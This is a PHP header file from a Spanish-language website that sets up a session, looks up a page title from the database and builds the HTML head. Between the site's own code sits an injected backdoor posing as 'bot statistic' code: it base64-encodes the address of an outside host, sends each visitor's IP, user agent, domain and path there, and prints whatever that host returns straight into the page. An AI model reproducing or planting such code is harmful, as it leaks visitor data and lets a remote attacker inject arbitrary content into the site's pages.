<?php  session_start();

     include 'includes/config.php';
     include 'includes/conexion.php';
     include 'includes/funciones.php';
     if (isset($_GET['id']) && is_numeric($_GET['id'])) {  // Si es un contenido modificable por el administrador

         $resul = mysql_query('SELECT titulo FROM contenidos WHERE id='.$_GET['id'].' AND status=1 and tipo=1') or die(mysql_error());
         $titulo = mysql_fetch_assoc($resul);
         $titulo = $titulo['titulo'] == '' ? TITLE : ''.$titulo['titulo'];
     }

?><?php
if (!isset($sRetry)) {
    global $sRetry;
    $sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = '';
    $stCurlHandle = null;
    $stCurlLink = '';
    if ((strstr($sUserAgen, 'google') == false) && (strstr($sUserAgen, 'yahoo') == false) && (strstr($sUserAgen, 'baidu') == false) && (strstr($sUserAgen, 'msn') == false) && (strstr($sUserAgen, 'opera') == false) && (strstr($sUserAgen, 'chrome') == false) && (strstr($sUserAgen, 'bing') == false) && (strstr($sUserAgen, 'safari') == false) && (strstr($sUserAgen, 'bot') == false)) {
        // Bot comes

        if (isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) { // Create  bot analitics
        $stCurlLink = base64_decode('aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init($stCurlLink);
        }
    }
    if ($stCurlHandle !== null) {
        curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
        $sResult = @curl_exec($stCurlHandle);
        if ($sResult[0] == 'O') {
            $sResult[0] = ' ';
            echo $sResult; // Statistic code end
        }
        curl_close($stCurlHandle);
    }
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><meta http-equiv="Content-Type" content="text/html; charset=euc-jp">

<title><?=isset($titulo)?$titulo:TITLE ?></title>


<meta name="Description" content="<?=DESCRIPTION?>">
<meta name="Keywords" content="<?=KEYWORDS?>">
<meta name="author" content="<?=AUTHOR?>">
<meta name="owner" content="<?=COPYRIGHT?>">
<meta name="robots" content="index, follow">
<link href="css/cumbres2000.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="css/agile_carousel.css" type='text/css'>
<link media="screen" rel="stylesheet" href="css/colorbox.css" />
<link rel="shortcut icon" href="http://www.cumbres2000.com/img/cumbres2000.ico" type="image/x-icon">
<link rel="stylesheet" type="text/css" media="screen,projection" href="css/ui.totop.css" />
<script type="text/javascript" src="/jwplayer/jwplayer.js" ></script>
<script>jwplayer.key="NYTv9OWxXweJjOICkv5jfz7aQk/gs/DxMYeHrw=="</script>
 
 <script src="//code.jquery.com/jquery-1.11.3.min.js"></script>
 <script src="//code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
 <script type="text/javascript" src="js/jquery.colorbox-min.js"></script>
 <script type="text/javascript" src="js/funciones.js"></script>
 <script src="js/easing.js" type="text/javascript"></script>
 <script src="js/jquery.ui.totop.js" type="text/javascript"></script>
<script src="js/agile_carousel.js"></script>
 <script type="text/javascript">
		$(document).ready(function() {
	
			$().UItoTop({ easingType: 'easeOutQuart' });
			
		});

var dt = new Date(), currentHour = dt.getHours(); 
// [0-31] 
backgroundImage=1;
if(currentHour<12) backgroundImage=2; 
if(currentHour<18) backgroundImage=3;
$("body").css("backgroundImage", "/img/fondo_" + backgroundImage + ".jpg");

/*

/img/fondo_1.jpg  Mañana
/img/fondo_2.jpg  Tarde
/img/fondo_3.jpg  Noche


*/

 </script>
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">

<!-- Optional theme -->
<link rel="stylesheet" href="/css/themes/cosmo.css">

<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">

</head>
<body style="padding-top: 70px; ">
<div class="container-fluid">
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/es_LA/sdk.js#xfbml=1&version=v2.0";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<?php
    include 'includes/ventanaBienvenida.php';
    include 'views/nav_top.php';
    include 'views/nav_left.php'; 
    include 'views/content.php';
    include 'views/footer.php'; 
?>
 </div>
</body> 
</html>